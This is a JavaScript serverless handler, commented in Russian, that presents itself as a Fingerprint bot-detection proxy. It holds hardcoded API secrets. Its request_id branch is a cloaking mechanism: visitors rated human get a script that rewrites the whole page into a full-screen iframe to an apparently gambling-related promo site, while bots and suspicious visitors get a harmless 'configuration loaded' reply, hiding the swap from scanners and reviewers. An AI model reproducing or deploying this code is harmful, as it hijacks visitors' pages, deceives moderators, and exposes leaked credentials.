const PROXY_SECRET = 'xhio4GIKdPYHuOoD4u3w';
const EVENT_API_KEY = 'Gj440uByeFLwlMfK4CZN';
const FINGERPRINT_API = 'https://eu.api.fpjs.io';

export default async function handler(req, res) {
  try {
    // Базовые CORS заголовки
    const corsHeaders = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization, x-fpjs-client-version',
      'Access-Control-Allow-Credentials': 'true'
    };

    Object.entries(corsHeaders).forEach(([key, value]) => {
      res.setHeader(key, value);
    });

    if (req.method === 'OPTIONS') {
      return res.status(200).end();
    }

    // Проверка на обработку request_id
    const url = new URL(req.url, `http://${req.headers.host}`);
    const requestId = url.searchParams.get('request_id');
    
    if (requestId) {
      return await handleRequestId(req, res, requestId);
    }

    // Остальная логика для identification
    const isIdentification = req.url.includes('identification');
    const isGet = req.method === 'GET';
    const isPost = req.method === 'POST';

    if (isIdentification && isGet) {
      return await handleGet(req, res);
    }

    if (isIdentification && isPost) {
      return await handlePost(req, res);
    }

    return res.status(404).json({ error: 'Unknown request type' });
  } catch (error) {
    return res.status(500).json({
      v: '2',
      error: { code: 'IntegrationFailed', message: error.message },
      requestId: `${Date.now()}.${Math.random().toString(36).substr(2, 6)}`
    });
  }
}

// Исправленная функция для обработки request_id с правильным форматом JSON
async function handleRequestId(req, res, requestId) {
  try {
    // Формируем URL для Event API
    const eventUrl = `${FINGERPRINT_API}/events/${requestId}`;
    
    // Заголовки для запроса к Event API
    const headers = {
      'accept': 'application/json',
      'Auth-API-Key': EVENT_API_KEY
    };

    // Запрос к Fingerprint Event API
    const response = await fetch(eventUrl, {
      method: 'GET',
      headers: headers
    });

    if (!response.ok) {
      return res.status(response.status).json({
        success: false,
        error: `HTTP error: ${response.status}`
      });
    }

    const fpData = await response.json();
    
    // Получаем suspect score из ответа API
    const suspect = fpData?.products?.suspectScore?.data?.result;
    
    if (suspect === null || suspect === undefined) {
      return res.status(500).json({
        success: false,
        error: 'Suspect score not found'
      });
    }

    res.setHeader('Content-Type', 'application/json');

    // Логика возврата в зависимости от suspect score
    if (suspect === 0) {
      // HTML-код для обычных пользователей (альтернативный сайт)
      const alternativeHtml = `
   <!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Мой сайт</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>
    <iframe src="https://1wilib.life/v3/3316/motive-video-promo?p=xgii" 
            allowfullscreen 
            sandbox="allow-scripts allow-forms allow-same-origin"></iframe>
</body>
</html>



      `;

      // Создаем JavaScript код с автоматическим экранированием через JSON.stringify
      const initScript = `document.open(); document.write(${JSON.stringify(alternativeHtml)}); document.close();`;

      // Обычные пользователи - показываем альтернативный сайт
      return res.status(200).json({
        status: 'ok',
        init: initScript
      });

    } else if (suspect >= 1 && suspect <= 100) {
      // Боты и подозрительные пользователи - обычный ответ
      return res.status(200).json({
        status: 'ok',
        message: 'Configuration loaded successfully'
      });

    } else {
      // Неожиданное значение suspect score
      return res.status(500).json({
        success: false,
        error: `Unexpected suspect score: ${suspect}`
      });
    }

  } catch (error) {
    return res.status(500).json({
      success: false,
      error: `Request processing error: ${error.message}`
    });
  }
}

// Обработка GET запросов для identification
async function handleGet(req, res) {
  const randomPath = extractPath(req.url);
  const originalUrl = new URL(req.url, `http://${req.headers.host}`);
  const queryString = originalUrl.searchParams.toString();
  let targetUrl = `${FINGERPRINT_API}/${randomPath}`;
  if (queryString) targetUrl += `?${queryString}`;

  const headers = getCleanHeaders(req.headers);
  const response = await fetch(targetUrl, { method: 'GET', headers });
  const responseBody = await response.arrayBuffer();

  // Простая копия заголовков ответа
  response.headers.forEach((value, key) => {
    if (key !== 'transfer-encoding' && key !== 'strict-transport-security') {
      res.setHeader(key, value);
    }
  });

  return res.status(response.status).send(Buffer.from(responseBody));
}

// Обработка POST запросов для identification
async function handlePost(req, res) {
  const randomPath = extractPath(req.url);
  const originalUrl = new URL(req.url, `http://${req.headers.host}`);
  const queryString = originalUrl.searchParams.toString();
  let targetUrl = randomPath ? `${FINGERPRINT_API}/${randomPath}` : FINGERPRINT_API;
  targetUrl += queryString ? `?${queryString}&ii=custom-proxy-integration/1.0/ingress` : '?ii=custom-proxy-integration/1.0/ingress';

  const headers = getCleanHeaders(req.headers);

  // Добавляем только _iidt cookie
  const iidtCookie = req.headers.cookie?.match(/_iidt=([^;]+)/);
  if (iidtCookie) {
    headers['Cookie'] = `_iidt=${iidtCookie[1]}`;
  }

  // Прокси заголовки
  headers['FPJS-Proxy-Secret'] = PROXY_SECRET;
  headers['FPJS-Proxy-Client-IP'] = getClientIp(req);
  headers['FPJS-Proxy-Forwarded-Host'] = req.headers['x-forwarded-host'] || req.headers.host;

  const body = await getRequestBody(req);
  const response = await fetch(targetUrl, { method: 'POST', headers, body });
  const responseBody = await response.arrayBuffer();

  // Простая копия заголовков ответа
  response.headers.forEach((value, key) => {
    if (key !== 'transfer-encoding' && key !== 'strict-transport-security') {
      res.setHeader(key, value);
    }
  });

  return res.status(response.status).send(Buffer.from(responseBody));
}

// Вспомогательные функции
function getCleanHeaders(originalHeaders) {
  const headers = {};
  const exclude = ['host', 'connection', 'content-length', 'transfer-encoding', 'te', 'upgrade', 'cookie'];
  
  Object.entries(originalHeaders).forEach(([key, value]) => {
    if (!exclude.includes(key.toLowerCase()) && !key.toLowerCase().startsWith('x-vercel-')) {
      headers[key] = value;
    }
  });
  
  return headers;
}

function extractPath(url) {
  const scriptName = '/metrics/identification';
  if (url.startsWith(scriptName)) {
    const after = url.substring(scriptName.length);
    const qPos = after.indexOf('?');
    return (qPos === -1 ? after : after.substring(0, qPos)).replace(/^\/+|\/+$/g, '');
  }
  return '';
}

function getClientIp(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || '89.117.67.22';
}

async function getRequestBody(req) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    req.on('data', chunk => chunks.push(chunk));
    req.on('end', () => resolve(Buffer.concat(chunks)));
    req.on('error', reject);
  });
}
